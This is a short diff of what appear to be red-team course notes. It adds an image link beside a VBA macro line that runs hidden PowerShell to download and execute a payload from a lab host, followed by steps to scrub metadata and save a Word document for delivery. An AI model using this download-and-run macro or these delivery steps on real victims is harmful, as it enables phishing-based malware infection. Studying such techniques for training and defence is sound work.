@@ -292,6 +292,8 @@ This will generate a PowerShell payload and host it on the team server so that i
 ```
 Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
 ```
+![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/20b20a5b-c41f-4193-a0ef-c613ec6724ab)
+
 To prepare the document for delivery, go to `File` > `Info` > `Inspect Document` > `Inspect Document`, which will bring up the Document Inspector. Click Inspect and then Remove All next to Document Properties and Personal Information.  This is to prevent the username on your system being embedded in the document.
 
 Next, go to `File` > `Save As` and save it to `C:\Payloads`.  Give it any filename, but in the Save as type dropdown, change the format from .docx to Word 97-2003 (.doc).
